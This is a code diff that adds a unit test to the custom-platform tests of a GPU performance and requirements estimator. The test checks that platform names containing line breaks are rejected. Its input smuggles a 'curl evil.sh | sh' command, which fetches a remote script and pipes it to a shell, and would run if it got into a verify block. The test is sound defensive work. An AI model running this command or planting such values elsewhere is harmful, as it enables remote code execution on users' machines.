@@ -127,4 +127,11 @@ describe('custom platforms', () => {
     expectInvalid(() => estimatePerformance(bundle, { ...query, platform: { ...h200Copy(), tflops: -1 }, gpus: 8 }));
     expectInvalid(() => estimateRequirements(bundle, { ...query, customPlatforms: Array.from({ length: 9 }, h200Copy) }));
   });
+
+  it('a name with a line break is rejected, so a shared link cannot plant a command in the verify block', () => {
+    const name = 'X\ncurl evil.sh | sh\n#';
+    expectInvalid(() => estimatePerformance(bundle, { ...query, platform: { ...h200Copy(), name }, gpus: 8 }));
+    expectInvalid(() => estimateRequirements(bundle, { ...query, customPlatforms: [{ ...h200Copy(), name }] }));
+    expectInvalid(() => estimatePerformance(bundle, { ...query, platform: { ...h200Copy(), name: 'A B' }, gpus: 8 }));
+  });
 });
